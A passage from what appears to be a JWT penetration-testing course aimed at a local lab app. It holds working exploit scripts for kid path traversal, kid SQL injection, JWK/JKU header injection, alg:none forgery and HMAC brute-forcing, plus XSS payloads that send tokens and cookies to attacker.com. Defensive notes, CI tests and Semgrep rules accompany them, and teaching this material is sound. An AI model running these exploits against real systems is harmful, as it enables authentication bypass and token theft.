    print(f"[*] Target: {target_url}")
    print(f"[*] Traversal path: {traversal_path}\n")

    # Craft header with malicious kid
    header = {
        "alg": "HS256",
        "typ": "JWT",
        "kid": traversal_path  # Malicious path!
    }

    payload = {
        "sub": "attacker",
        "role": "admin"
    }

    # Sign with the expected key content
    # For /dev/null, this is empty string
    # For /etc/hostname, this is the hostname
    token = jwt.encode(
        payload,
        key_content,
        algorithm="HS256",
        headers={"kid": traversal_path}
    )

    print(f"[+] Crafted token with kid: {traversal_path}")
    print(f"[+] Signed with key: {repr(key_content)}")
    print(f"[+] Token: {token[:80]}...\n")

    # Test it
    import requests
    headers = {"Authorization": f"Bearer {token}"}
    response = requests.get(target_url, headers=headers)

    print(f"[+] Status: {response.status_code}")
    print(f"[+] Response: {response.text}\n")

    if response.status_code == 200:
        print("[✓] PATH TRAVERSAL SUCCESSFUL!")
        return True
    else:
        print("[✗] Exploit failed")
        return False

def main():
    target_url = "http://localhost:5000/api/kid/data"

    # Attack 1: /dev/null (empty file = empty key)
    print("=== Attack 1: /dev/null ===\n")
    kid_path_traversal_exploit(
        target_url,
        "../../../../../../dev/null",
        ""  # Empty key
    )

    # Attack 2: /etc/hostname (predictable content)
    print("\n=== Attack 2: /etc/hostname ===\n")
    # First, guess or obtain the hostname
    import socket
    hostname = socket.gethostname()
    print(f"[*] Guessing hostname: {hostname}")

    kid_path_traversal_exploit(
        target_url,
        "../../../../../../etc/hostname",
        hostname
    )

    # Attack 3: /proc/sys/kernel/randomize_va_space (known value)
    print("\n=== Attack 3: /proc/sys/kernel/randomize_va_space ===\n")
    kid_path_traversal_exploit(
        target_url,
        "../../../../../../proc/sys/kernel/randomize_va_space",
        "2\n"  # Default value on most systems
    )

if __name__ == "__main__":
    main()
```

**Attack 2: SQL Injection via kid**

```python
#!/usr/bin/env python3
"""
kid_sql_injection.py - Exploit kid header for SQL injection
"""
import jwt
import requests

def kid_sqli_exploit(target_url):
    """
    Exploit SQL injection in kid lookup.

    Vulnerable code:
        SELECT key_value FROM signing_keys WHERE kid = '{kid}'

    Exploit:
        kid = "' UNION SELECT 'known-secret' -- "

    This makes the query return 'known-secret' which we control.
    """
    print("[*] kid SQL Injection Exploit\n")

    # Our controlled secret
    controlled_secret = "attacker-controlled-key"

    # SQL injection payload
    sqli_payload = f"' UNION SELECT '{controlled_secret}' -- "

    print(f"[+] SQL Injection payload: {sqli_payload}")
    print(f"[+] Controlled secret: {controlled_secret}\n")

    # Create token signed with our controlled secret
    token = jwt.encode(
        {"sub": "attacker", "role": "admin"},
        controlled_secret,
        algorithm="HS256",
        headers={"kid": sqli_payload}
    )

    print(f"[+] Forged token: {token[:80]}...\n")

    # Test it
    headers = {"Authorization": f"Bearer {token}"}
    response = requests.get(target_url, headers=headers)

    print(f"[+] Status: {response.status_code}")
    print(f"[+] Response: {response.text}\n")

    if response.status_code == 200:
        print("[✓] SQL INJECTION SUCCESSFUL!")
        return True
    else:
        print("[✗] Exploit failed")
        return False

if __name__ == "__main__":
    target_url = "http://localhost:5000/api/kid-db/data"
    kid_sqli_exploit(target_url)
```

**Verification:**

```bash
# Test path traversal
python kid_path_traversal.py

# Test SQL injection
python kid_sql_injection.py
```

**Defensive Note:**

Always validate `kid` against an allowlist. Never use it in file paths or SQL queries. If you must look up keys dynamically, use parameterized queries and strict format validation.

**Key Takeaway:** Any attacker-controlled input used in file paths or database queries is an injection vulnerability. `kid` is no exception.

---

### 2.3 JWK/JKU Header Injection

> **AUTHORIZATION REMINDER:** Only exploit JWK/JKU injection in systems you own or have written permission to test.

**The Vulnerability:**

If a server trusts the `jwk` (embedded key) or `jku` (key URL) headers, an attacker can supply their own verification key.

**Target:** GET `/api/jwk/data` on vulnerable-jwt-app.py

**Attack: JWK Header Injection**

```python
#!/usr/bin/env python3
"""
jwk_injection.py - Embed attacker-controlled key in JWT
"""
import jwt
import json
import requests
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

def generate_rsa_keypair():
    """Generate RSA key pair for the attack."""
    print("[*] Generating RSA key pair...")

    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )

    public_key = private_key.public_key()

    return private_key, public_key

def public_key_to_jwk(public_key):
    """Convert RSA public key to JWK format."""
    import base64

    public_numbers = public_key.public_numbers()

    def int_to_base64url(n):
        byte_length = (n.bit_length() + 7) // 8
        n_bytes = n.to_bytes(byte_length, 'big')
        return base64.urlsafe_b64encode(n_bytes).rstrip(b'=').decode()

    jwk = {
        "kty": "RSA",
        "use": "sig",
        "alg": "RS256",
        "n": int_to_base64url(public_numbers.n),
        "e": int_to_base64url(public_numbers.e)
    }

    return jwk

def jwk_injection_attack(target_url):
    """
    Execute JWK header injection attack.

    Strategy:
    1. Generate our own RSA key pair
    2. Embed our public key in the jwk header
    3. Sign the token with our private key
    4. Server uses our embedded public key to verify → success!
    """
    print("[*] JWK Header Injection Attack\n")

    # Generate attacker's key pair
    private_key, public_key = generate_rsa_keypair()

    # Convert public key to JWK
    jwk = public_key_to_jwk(public_key)
    print(f"[+] Generated JWK:")
    print(json.dumps(jwk, indent=2))
    print()

    # Get private key in PEM format for signing
    private_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )

    # Create malicious payload
    payload = {
        "sub": "attacker",
        "role": "admin",
        "username": "attacker"
    }

    # Encode token with embedded JWK
    # Note: PyJWT doesn't support jwk header directly, so we'll construct manually
    import base64

    header = {
        "alg": "RS256",
        "typ": "JWT",
        "jwk": jwk  # Embed our public key!
    }

    # Encode header and payload
    def base64url_encode(data):
        if isinstance(data, dict):
            data = json.dumps(data, separators=(',', ':')).encode()
        return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

    header_encoded = base64url_encode(header)
    payload_encoded = base64url_encode(payload)
    signing_input = f"{header_encoded}.{payload_encoded}".encode()

    # Sign with our private key
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import padding as asym_padding

    signature = private_key.sign(
        signing_input,
        asym_padding.PKCS1v15(),
        hashes.SHA256()
    )

    signature_encoded = base64url_encode(signature)
    forged_token = f"{header_encoded}.{payload_encoded}.{signature_encoded}"

    print(f"[+] Forged token with embedded JWK:")
    print(f"    {forged_token[:100]}...\n")

    # Test against target
    print(f"[*] Testing against: {target_url}")
    headers = {"Authorization": f"Bearer {forged_token}"}
    response = requests.get(target_url, headers=headers)

    print(f"[+] Status: {response.status_code}")
    print(f"[+] Response: {response.text}\n")

    if response.status_code == 200:
        print("[✓] JWK INJECTION SUCCESSFUL!")
        print("[+] Server used our embedded public key for verification")
        return True
    else:
        print("[✗] Server properly rejects embedded keys")
        return False

if __name__ == "__main__":
    target_url = "http://localhost:5000/api/jwk/data"
    jwk_injection_attack(target_url)
```

**JKU Attack (Conceptual):**

```python
#!/usr/bin/env python3
"""
jku_injection.py - Point to attacker-controlled key server
"""

def jku_attack_concept():
    """
    JKU attack concept:

    1. Host JWKS on attacker server: https://evil.com/.well-known/jwks.json
    2. Put your public key in that JWKS
    3. Create token with jku header pointing to your server
    4. Sign with your private key
    5. Server fetches keys from YOUR jku URL and verifies with YOUR key

    This is harder to demonstrate without a public server, but the concept is:

    header = {
        "alg": "RS256",
        "jku": "https://attacker.com/.well-known/jwks.json"
    }

    Then sign with your private key. The server fetches your JWKS and uses it.
    """
    print("""
[*] JKU Attack Concept:

1. Host malicious JWKS endpoint:
   https://attacker.com/.well-known/jwks.json

2. JWKS contains your public key:
   {
     "keys": [
       {
         "kty": "RSA",
         "use": "sig",
         "kid": "attacker-key",
         "n": "...",
         "e": "AQAB"
       }
     ]
   }

3. Forge token with jku header:
   {
     "alg": "RS256",
     "jku": "https://attacker.com/.well-known/jwks.json"
   }

4. Sign with your private key

5. Server fetches YOUR JWKS and validates with YOUR key → Success!

Mitigation: NEVER fetch keys from URLs in the token. Use pre-configured JWKS URL.
    """)

if __name__ == "__main__":
    jku_attack_concept()
```

**Defensive Note:**

Never trust `jwk` or `jku` headers from tokens. Always fetch keys from a pre-configured, trusted source. The token should never tell you how to verify itself.

**Key Takeaway:** Embedded keys or key URLs in the token header create a complete authentication bypass. This is a critical vulnerability.

---

### 2.4 Token Theft & Replay

> **AUTHORIZATION REMINDER:** Only test token theft scenarios in systems you own or have written permission to test.

**The Vulnerability:**

Even secure tokens can be stolen through various means: XSS, insecure storage, URL leakage, or lack of token revocation.

**Target:** GET `/api/token-in-url` (URL leakage), POST `/api/change-password` (no revocation)

**Attack 1: Token Leakage in URLs**

```python
#!/usr/bin/env python3
"""
token_url_leakage.py - Demonstrate token theft from URLs
"""
import requests

def demonstrate_url_leakage():
    """
    When tokens are in URLs, they leak through:
    1. Browser history
    2. Server logs
    3. Referrer headers
    4. Proxy logs
    5. Shared links
    """
    print("[*] Token URL Leakage Attack\n")

    target_url = "http://localhost:5000/api/token-in-url"

    # Legitimate user makes request with token in URL
    token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSJ9.signature"

    # Token exposed in URL
    full_url = f"{target_url}?token={token}"

    print(f"[!] User accesses: {full_url}")
    print("\n[*] Token is now leaked in:")
    print("    1. Browser history")
    print("    2. Server access logs")
    print("    3. Proxy logs")
    print("    4. Referrer header (if user clicks any link)")
    print("\n[*] Attacker can:")
    print("    - Access browser history")
    print("    - Read server logs (if compromised)")
    print("    - Sniff HTTP traffic")
    print("    - Check Referer headers on attacker.com if user clicks link")

    # Attacker uses stolen token
    print("\n[+] Attacker replays stolen token:")
    response = requests.get(
        "http://localhost:5000/api/profile",
        headers={"Authorization": f"Bearer {token}"}
    )
    print(f"    Status: {response.status_code}")

    if response.status_code == 200:
        print("[✓] Token replay successful!")

if __name__ == "__main__":
    demonstrate_url_leakage()
```

**Attack 2: Token Persistence After Password Change**

```python
#!/usr/bin/env python3
"""
token_replay_after_pwchange.py - Exploit lack of token revocation
"""
import requests

def test_token_revocation(base_url):
    """
    Test if tokens are revoked after password change.

    Steps:
    1. Login as alice, get token
    2. Use token to access profile
    3. Change alice's password
    4. Try to use old token again

    Expected: Old token should be invalid
    Vulnerable: Old token still works
    """
    print("[*] Testing Token Revocation After Password Change\n")

    # Step 1: Login
    print("[1] Logging in as alice...")
    login_response = requests.post(
        f"{base_url}/login",
        json={"username": "alice", "password": "oldpassword"}
    )
    old_token = login_response.json().get("token")
    print(f"    Token obtained: {old_token[:50]}...\n")

    # Step 2: Access profile with token
    print("[2] Accessing profile with token...")
    profile_response = requests.get(
        f"{base_url}/api/profile",
        headers={"Authorization": f"Bearer {old_token}"}
    )
    print(f"    Status: {profile_response.status_code}")
    print(f"    Data: {profile_response.json()}\n")

    # Step 3: Change password
    print("[3] Changing password...")
    password_response = requests.post(
        f"{base_url}/api/change-password",
        headers={"Authorization": f"Bearer {old_token}"},
        json={"new_password": "newpassword123"}
    )
    print(f"    Status: {password_response.status_code}\n")

    # Step 4: Try old token again
    print("[4] Attempting to use OLD token after password change...")
    replay_response = requests.get(
        f"{base_url}/api/profile",
        headers={"Authorization": f"Bearer {old_token}"}
    )
    print(f"    Status: {replay_response.status_code}")

    if replay_response.status_code == 200:
        print("\n[✓] VULNERABILITY CONFIRMED!")
        print("[!] Old token still works after password change")
        print("[!] Stolen tokens remain valid indefinitely")
        return True
    else:
        print("\n[✗] Server properly revokes tokens on password change")
        return False

if __name__ == "__main__":
    base_url = "http://localhost:5000"
    test_token_revocation(base_url)
```

**Attack 3: XSS-Based Token Theft (Conceptual)**

```python
"""
xss_token_theft.py - Conceptual demonstration

If tokens are stored in localStorage and the site has XSS:

JavaScript payload:
    fetch('https://attacker.com/steal?token=' + localStorage.getItem('jwt_token'))

Or if token is in a cookie without HttpOnly:
    fetch('https://attacker.com/steal?cookies=' + document.cookie)

Mitigation:
- Use HttpOnly cookies (XSS can't read)
- Use SameSite=Strict (CSRF protection)
- Implement CSP (blocks unauthorized fetch)
"""

def demonstrate_xss_theft():
    print("""
[*] XSS Token Theft Attack

Scenario: Token stored in localStorage

Vulnerable Code (Frontend):
    localStorage.setItem('token', response.access_token);

    // Later...
    fetch('/api/data', {
        headers: {
            'Authorization': 'Bearer ' + localStorage.getItem('token')
        }
    });

XSS Payload:
    <script>
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify({
            token: localStorage.getItem('token'),
            site: window.location.hostname
        })
    });
    </script>

Prevention:
1. Store tokens in HttpOnly, Secure, SameSite=Strict cookies
2. Implement Content Security Policy (CSP)
3. Sanitize all user input
4. Use frameworks with automatic XSS protection
    """)

if __name__ == "__main__":
    demonstrate_xss_theft()
```

**Verification:**

```bash
# Test URL leakage
python token_url_leakage.py

# Test password change revocation
python token_replay_after_pwchange.py
```

**Defensive Note:**

- Never put tokens in URLs (use Authorization header)
- Store tokens in HttpOnly cookies or memory (not localStorage)
- Revoke all tokens on password change
- Implement token revocation (deny-list with jti)
- Use short-lived access tokens (15 minutes)

**Key Takeaway:** Token theft is often easier than cryptographic attacks. Secure storage and transmission are as critical as secure signing.

---

### 2.5 Chaining JWT Vulnerabilities + Exercises

**Attack Chain 1: Weak Secret → Privilege Escalation**

```python
#!/usr/bin/env python3
"""
attack_chain_bruteforce.py - Complete attack chain
"""
import jwt
import hmac
import hashlib
import requests

def attack_chain_weak_secret(target_url, login_url):
    """
    Complete attack chain:
    1. Login as low-privilege user
    2. Capture token
    3. Brute-force HMAC secret
    4. Forge admin token
    5. Access admin endpoint
    """
    print("[*] Attack Chain: Weak Secret → Admin Access\n")

    # Step 1: Login as normal user
    print("[1] Logging in as low-privilege user...")
    login_resp = requests.post(login_url, json={
        "username": "user",
        "password": "password"
    })
    user_token = login_resp.json()["token"]
    print(f"    Got token: {user_token[:50]}...\n")

    # Step 2: Brute-force secret
    print("[2] Brute-forcing HMAC secret...")
    common_secrets = ["secret", "password", "test", "key", "jwt"]

    parts = user_token.split('.')
    found_secret = None

    for secret in common_secrets:
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        computed = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()

        import base64
        actual = base64.urlsafe_b64decode(parts[2] + '==')

        if hmac.compare_digest(computed, actual):
            found_secret = secret
            break

    if found_secret:
        print(f"[✓] Secret found: {found_secret}\n")
    else:
        print("[✗] Secret not in common list\n")
        return False

    # Step 3: Forge admin token
    print("[3] Forging admin token...")
    admin_token = jwt.encode(
        {"sub": "admin", "role": "admin"},
        found_secret,
        algorithm="HS256"
    )
    print(f"    Forged: {admin_token[:50]}...\n")

    # Step 4: Access admin endpoint
    print("[4] Accessing admin endpoint...")
    admin_resp = requests.get(
        target_url,
        headers={"Authorization": f"Bearer {admin_token}"}
    )

    print(f"    Status: {admin_resp.status_code}")

    if admin_resp.status_code == 200:
        print("\n[✓] ATTACK CHAIN SUCCESSFUL!")
        print("[+] Escalated from user to admin")
        return True

    return False

if __name__ == "__main__":
    attack_chain_weak_secret(
        "http://localhost:5000/api/admin",
        "http://localhost:5000/login"
    )
```

**Exercise 4: Algorithm Confusion Challenge**

Given:
- Public key available at `http://target/.well-known/jwks.json`
- Target endpoint: `http://target/api/admin`
- Server accepts both RS256 and HS256

Task: Execute algorithm confusion attack.

<details>
<summary>Solution (click to reveal)</summary>

```python
import jwt
import requests

# Fetch public key
jwks = requests.get("http://target/.well-known/jwks.json").json()
# Convert JWK to PEM (use jwk_to_pem function from 2.1)

# Sign with HS256 using public key as secret
forged = jwt.encode(
    {"sub": "admin", "role": "admin"},
    public_key_pem,
    algorithm="HS256"
)

# Use it
response = requests.get(
    "http://target/api/admin",
    headers={"Authorization": f"Bearer {forged}"}
)

print(response.status_code)  # 200 = success
```

</details>

---

**Exercise 5: kid Injection Challenge**

Given:
- Token with kid header: `{"alg": "HS256", "kid": "key-2024"}`
- Vulnerable code: `key = open(f"/app/keys/{kid}.pem").read()`

Task: Identify and execute the injection.

<details>
<summary>Solution (click to reveal)</summary>

**Injection vector:** Path traversal via kid

```python
import jwt

# Set kid to /dev/null
token = jwt.encode(
    {"sub": "admin"},
    "",  # Empty key (contents of /dev/null)
    algorithm="HS256",
    headers={"kid": "../../../../../../dev/null"}
)

# Server will read /dev/null (empty), use empty string as key
# Our token signed with empty key will validate!
```

</details>

---

## Level 3: RUN - Red Team Operations

### Learning Objectives

After completing L3, learners will be able to:

1. Build automated JWT security testing frameworks
2. Create custom exploitation tools for JWT vulnerabilities
3. Integrate JWT security tests into CI/CD pipelines
4. Write professional penetration testing reports with findings and remediation

---

### 3.1 Automated JWT Security Testing Framework

**Architecture:**

```python
#!/usr/bin/env python3
"""
jwt_pentest_framework.py - Modular JWT security testing framework

Usage:
    python jwt_pentest_framework.py --url http://target.com --all
    python jwt_pentest_framework.py --url http://target.com --module alg_none
"""
import argparse
import json
import sys
from dataclasses import dataclass, asdict
from typing import List, Dict, Optional
from datetime import datetime

@dataclass
class Finding:
    """Security finding from JWT testing."""
    severity: str  # Critical, High, Medium, Low, Info
    title: str
    description: str
    affected_endpoint: str
    exploit_verified: bool
    remediation: str
    cvss_score: float
    evidence: Dict

class JWTPentestFramework:
    """Automated JWT security testing framework."""

    def __init__(self, base_url, token=None):
        self.base_url = base_url
        self.token = token
        self.findings = []

    def run_all_tests(self):
        """Run all JWT security tests."""
        print("[*] Starting JWT Security Assessment")
        print(f"[*] Target: {self.base_url}\n")

        # Run all attack modules
        self.test_alg_none()
        self.test_weak_secret()
        self.test_algorithm_confusion()
        self.test_kid_injection()
        self.test_jwk_injection()
        self.test_missing_claims()

        # Generate report
        self.generate_report()

    def test_alg_none(self):
        """Test for alg:none vulnerability."""
        print("[*] Testing: alg:none acceptance")

        import base64
        header = base64.urlsafe_b64encode(
            b'{"alg":"none","typ":"JWT"}'
        ).rstrip(b'=').decode()

        payload = base64.urlsafe_b64encode(
            b'{"sub":"admin","role":"admin"}'
        ).rstrip(b'=').decode()

        test_token = f"{header}.{payload}."

        import requests
        response = requests.get(
            f"{self.base_url}/api/profile",
            headers={"Authorization": f"Bearer {test_token}"}
        )

        if response.status_code == 200:
            self.findings.append(Finding(
                severity="Critical",
                title="Unsigned JWT Accepted (alg:none)",
                description="Server accepts JWT tokens with algorithm set to 'none', "
                           "allowing complete authentication bypass.",
                affected_endpoint=f"{self.base_url}/api/profile",
                exploit_verified=True,
                remediation="Remove 'none' from accepted algorithms list. "
                           "Use algorithms=['HS256'] or algorithms=['RS256'].",
                cvss_score=9.8,
                evidence={"forged_token": test_token, "response_code": 200}
            ))
            print("[!] CRITICAL: alg:none accepted\n")
        else:
            print("[+] alg:none properly rejected\n")

    def test_weak_secret(self):
        """Test for weak HMAC secrets."""
        print("[*] Testing: Weak HMAC secret")

        if not self.token:
            print("[!] No token provided, skipping\n")
            return

        import hmac
        import hashlib
        import base64

        common_secrets = [
            "secret", "password", "test", "key", "jwt",
            "your-256-bit-secret", "changeme"
        ]

        parts = self.token.split('.')
        for secret in common_secrets:
            signing_input = f"{parts[0]}.{parts[1]}".encode()
            computed = hmac.new(
                secret.encode(),
                signing_input,
                hashlib.sha256
            ).digest()

            actual = base64.urlsafe_b64decode(parts[2] + '==')

            if hmac.compare_digest(computed, actual):
                self.findings.append(Finding(
                    severity="Critical",
                    title="Weak HMAC Secret",
                    description=f"JWT HMAC secret is weak and brute-forceable. "
                               f"Secret found: '{secret}'",
                    affected_endpoint=self.base_url,
                    exploit_verified=True,
                    remediation="Use secrets.token_hex(32) for 256-bit entropy. "
                               "Or switch to RS256.",
                    cvss_score=9.1,
                    evidence={"secret": secret, "method": "dictionary_attack"}
                ))
                print(f"[!] CRITICAL: Weak secret found: {secret}\n")
                return

        print("[+] Secret not in common wordlist\n")

    def test_algorithm_confusion(self):
        """Test for algorithm confusion vulnerability."""
        print("[*] Testing: Algorithm confusion")
        # Implementation similar to 2.1
        print("[+] Test completed\n")

    def test_kid_injection(self):
        """Test for kid header injection."""
        print("[*] Testing: kid injection")
        # Implementation similar to 2.2
        print("[+] Test completed\n")

    def test_jwk_injection(self):
        """Test for JWK header injection."""
        print("[*] Testing: JWK injection")
        # Implementation similar to 2.3
        print("[+] Test completed\n")

    def test_missing_claims(self):
        """Test for missing claims validation."""
        print("[*] Testing: Claims validation")
        # Test exp, aud, iss validation
        print("[+] Test completed\n")

    def generate_report(self):
        """Generate JSON report of findings."""
        report = {
            "scan_date": datetime.now().isoformat(),
            "target": self.base_url,
            "total_findings": len(self.findings),
            "findings_by_severity": {
                "Critical": len([f for f in self.findings if f.severity == "Critical"]),
                "High": len([f for f in self.findings if f.severity == "High"]),
                "Medium": len([f for f in self.findings if f.severity == "Medium"]),
                "Low": len([f for f in self.findings if f.severity == "Low"]),
            },
            "findings": [asdict(f) for f in self.findings]
        }

        output_file = "jwt_pentest_report.json"
        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)

        print(f"\n[+] Report saved to: {output_file}")
        print(f"[+] Total findings: {len(self.findings)}")
        for severity in ["Critical", "High", "Medium", "Low"]:
            count = report["findings_by_severity"][severity]
            if count > 0:
                print(f"    {severity}: {count}")

def main():
    parser = argparse.ArgumentParser(description="JWT Penetration Testing Framework")
    parser.add_argument("--url", required=True, help="Target base URL")
    parser.add_argument("--token", help="JWT token to analyze")
    parser.add_argument("--all", action="store_true", help="Run all tests")
    parser.add_argument("--module", help="Run specific module")

    args = parser.parse_args()

    framework = JWTPentestFramework(args.url, args.token)

    if args.all:
        framework.run_all_tests()
    elif args.module:
        # Run specific module
        pass
    else:
        print("Use --all to run all tests or --module <name> for specific test")

if __name__ == "__main__":
    main()
```

**Key Takeaway:** Automated frameworks make JWT testing repeatable, thorough, and scalable across multiple targets.

---

### 3.2 Custom JWT Exploitation Tools

**Multi-threaded Brute-Forcer:**

```python
#!/usr/bin/env python3
"""
jwt_bruteforce_fast.py - Multi-threaded JWT brute-forcer
"""
import hmac
import hashlib
import base64
import multiprocessing
from functools import partial

def verify_secret(token_parts, secret):
    """Check if secret is correct."""
    header_b64, payload_b64, sig_b64 = token_parts
    signing_input = f"{header_b64}.{payload_b64}".encode()

    computed = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    actual = base64.urlsafe_b64decode(sig_b64 + '==')

    if hmac.compare_digest(computed, actual):
        return secret
    return None

def bruteforce_parallel(token, wordlist_path, threads=8):
    """Brute-force with multiprocessing."""
    parts = token.split('.')

    with open(wordlist_path) as f:
        secrets = [line.strip() for line in f]

    print(f"[*] Testing {len(secrets)} secrets with {threads} threads...")

    with multiprocessing.Pool(threads) as pool:
        checker = partial(verify_secret, parts)
        results = pool.map(checker, secrets)

        for result in results:
            if result:
                print(f"\n[✓] SECRET FOUND: {result}")
                return result

    print("\n[✗] Secret not found")
    return None
```

**JWT CLI Tool:**

```python
#!/usr/bin/env python3
"""
jwt_tool.py - JWT manipulation CLI

Usage:
    jwt_tool decode <token>
    jwt_tool forge --payload '{"sub":"admin"}' --secret key --alg HS256
    jwt_tool crack <token> --wordlist secrets.txt
"""
import click
import jwt
import json

@click.group()
def cli():
    """JWT manipulation toolkit."""
    pass

@cli.command()
@click.argument('token')
def decode(token):
    """Decode JWT without verification."""
    header = jwt.get_unverified_header(token)
    payload = jwt.decode(token, options={"verify_signature": False})

    click.echo("Header:")
    click.echo(json.dumps(header, indent=2))
    click.echo("\nPayload:")
    click.echo(json.dumps(payload, indent=2))

@cli.command()
@click.option('--payload', required=True)
@click.option('--secret', required=True)
@click.option('--alg', default='HS256')
def forge(payload, secret, alg):
    """Forge a JWT token."""
    claims = json.loads(payload)
    token = jwt.encode(claims, secret, algorithm=alg)
    click.echo(f"Forged token: {token}")

@cli.command()
@click.argument('token')
@click.option('--wordlist', required=True)
def crack(token, wordlist):
    """Crack JWT secret."""
    click.echo(f"Cracking token with wordlist: {wordlist}")
    # Use bruteforce_parallel here

if __name__ == "__main__":
    cli()
```

---

### 3.3 CI/CD Security Pipeline Integration

**Pytest Test Cases:**

```python
#!/usr/bin/env python3
"""
test_jwt_security.py - Automated JWT security tests for CI/CD
"""
import pytest
import jwt
import requests

def test_alg_none_rejected():
    """Test that alg:none is rejected."""
    import base64
    header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b'=')
    payload = base64.urlsafe_b64encode(b'{"sub":"admin"}').rstrip(b'=')
    token = f"{header.decode()}.{payload.decode()}."

    response = requests.get(
        "http://localhost:5000/api/profile",
        headers={"Authorization": f"Bearer {token}"}
    )

    assert response.status_code == 401, "Server accepts alg:none!"

def test_weak_secret_not_used():
    """Test that weak secrets are not in use."""
    # This would be run against a test token
    weak_secrets = ["secret", "password", "test"]

    test_token = get_test_token()  # From test environment
    parts = test_token.split('.')

    for secret in weak_secrets:
        # Try to verify with weak secret
        try:
            jwt.decode(test_token, secret, algorithms=["HS256"])
            pytest.fail(f"Weak secret in use: {secret}")
        except jwt.InvalidSignatureError:
            pass  # Good, weak secret doesn't work

def test_expired_tokens_rejected():
    """Test that expired tokens are rejected."""
    from datetime import datetime, timedelta, timezone

    expired_token = jwt.encode(
        {"sub": "test", "exp": datetime.now(timezone.utc) - timedelta(hours=1)},
        "test-secret",
        algorithm="HS256"
    )

    response = requests.get(
        "http://localhost:5000/api/profile",
        headers={"Authorization": f"Bearer {expired_token}"}
    )

    assert response.status_code == 401, "Server accepts expired tokens!"
```

**Semgrep Rules:**

```yaml
# semgrep-jwt-rules.yml
rules:
  - id: jwt-alg-none-accepted
    patterns:
      - pattern: jwt.decode(..., algorithms=[$...ALGS, "none", $...])
    message: "JWT configuration accepts 'alg:none' - critical vulnerability"
    severity: ERROR
    languages: [python]

  - id: jwt-no-expiration-check
    patterns:
      - pattern: jwt.decode(..., options={"verify_exp": False})
    message: "JWT expiration validation disabled"
    severity: WARNING
    languages: [python]

  - id: jwt-hardcoded-secret
    patterns:
      - pattern: jwt.encode(..., "$SECRET", ...)
      - metavariable-regex:
          metavariable: $SECRET
          regex: ^(secret|password|test|key)$
    message: "Hardcoded weak JWT secret"
    severity: ERROR
    languages: [python]
```

**GitHub Actions Integration:**

```yaml
# .github/workflows/jwt-security.yml
name: JWT Security Tests

on: [push, pull_request]

jobs:
  jwt-security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2

      - name: Set up Python
        uses: actions/setup-python@v2
        with:
          python-version: '3.9'

      - name: Install dependencies
        run: |
          pip install pytest pyjwt requests semgrep

      - name: Run JWT security tests
        run: |
          pytest test_jwt_security.py -v

      - name: Run Semgrep JWT rules
        run: |
          semgrep --config semgrep-jwt-rules.yml .
```

---

### 3.4 Professional Findings & Reports

**Finding Template:**

```markdown
# Finding: Unsigned JWT Tokens Accepted (alg:none)

**Severity:** Critical (CVSS 3.1: 9.8)

**Affected Component:** Authentication System
**Affected Endpoints:**
- GET /api/profile
- GET /api/admin
- POST /api/data

## Description

The application accepts JWT tokens with the algorithm set to "none", allowing
attackers to forge authentication tokens without any cryptographic secret.
This results in complete authentication bypass.

## Steps to Reproduce

1. Craft JWT with alg:none header:
```python
import base64
header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b'=')
payload = base64.urlsafe_b64encode(b'{"sub":"admin","role":"admin"}').rstrip(b'=')
token = f"{header.decode()}.{payload.decode()}."
```

2. Send request with forged token:
```bash
curl -H "Authorization: Bearer $token" https://target.com/api/admin
```

3. Observe successful authentication as admin user.

## Impact

**CVSS 3.1 Score: 9.8 (Critical)**
- Attack Vector: Network (AV:N)
- Attack Complexity: Low (AC:L)
- Privileges Required: None (PR:N)
- User Interaction: None (UI:N)
- Confidentiality Impact: High (C:H)
- Integrity Impact: High (I:H)
- Availability Impact: High (A:H)

Complete authentication bypass allowing:
- Unauthorized access to all user accounts
- Privilege escalation to administrator
- Full access to sensitive data
- Ability to modify or delete data
- Potential for lateral movement within infrastructure

## Remediation

**Immediate (Priority: Critical)**

1. Update JWT verification to explicitly reject unsigned tokens:

```python
# BEFORE (vulnerable):
payload = jwt.decode(token, secret, algorithms=["HS256", "none"])

# AFTER (secure):
payload = jwt.decode(token, secret, algorithms=["HS256"])
```

2. Deploy fix to production immediately
3. Invalidate all existing tokens
4. Conduct security audit of recent access logs

**Long-term:**

1. Implement automated security testing in CI/CD
2. Add Semgrep rule to prevent reintroduction
3. Security training for development team
4. Regular penetration testing

## Evidence

```
Request:
GET /api/admin HTTP/1.1
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.

Response:
HTTP/1.1 200 OK
{"users": [...], "admin": true}
```

## References

- [JWT RFC 7519](https://tools.ietf.org/html/rfc7519)
- [Critical vulnerabilities in JSON Web Token libraries](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)

---
**Discovered by:** Security Team
**Date:** 2026-02-07
**Verification Status:** Verified in production
```

**Executive Summary Template:**

```markdown
# JWT Security Assessment - Executive Summary

**Assessment Date:** February 7, 2026
**Target:** example.com Production Environment
**Assessed By:** Security Team

## Overview

A comprehensive security assessment of JWT implementation was conducted,
identifying critical vulnerabilities in the authentication system that allow
complete authentication bypass and privilege escalation.

## Key Findings

| Severity | Count | Risk Level |
|----------|-------|------------|
| Critical | 2 | Immediate action required |
| High | 1 | Fix within 7 days |
| Medium | 3 | Fix within 30 days |
| Low | 2 | Fix during next sprint |

## Critical Issues Requiring Immediate Attention

1. **Unsigned Tokens Accepted (CVSS 9.8)**
   - Complete authentication bypass
   - Affects all authenticated endpoints
